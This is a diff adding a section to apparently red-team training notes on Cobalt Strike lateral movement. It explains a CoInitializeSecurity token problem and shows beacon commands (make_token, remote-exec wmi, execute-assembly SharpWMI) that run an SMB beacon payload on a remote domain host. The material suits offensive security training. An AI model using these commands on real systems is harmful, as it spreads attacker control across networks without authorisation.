@@ -143,6 +143,25 @@ After executing the beacon we will neeed to connect to it.
 beacon> link dc01 \\dc01\pipe\[namepipe]
 ```
 
+## The Curious Case of CoInitializeSecurity
+
+If our beacon called CoInitializeSecurity in the context of "UserA" then the future BOFs such as WMI may not be able to inherit a different security context "UserB".
+
+```
+beacon> make_token CORP\userb password
+[+] Impersonated CORP\usera
+
+beacon> remote-exec wmi web.corp.local C:\Windows\smb_x64.exe
+CoInitializeSecurity already called. Thread token (if there is one) may not get used
+[-] Could not connect to web.dev.cyberbotic.io: 5
+```
+
+Our WMI execution needs to come from a different process. This can be achieved with commands such as `spawn` and `spawnas` or even `SharpWMI`.
+
+```
+beacon> execute-assembly C:\Tools\SharpWMI.exe action=exec computername=web.corp.local command="C:\Windows\smb_x64.exe"
+```
+
 # Distributed Component Object Model (DCOM)
 
 Beacon has no built-in capabilities to interact over DCOM, so we can use `Invoke-DCOM`.
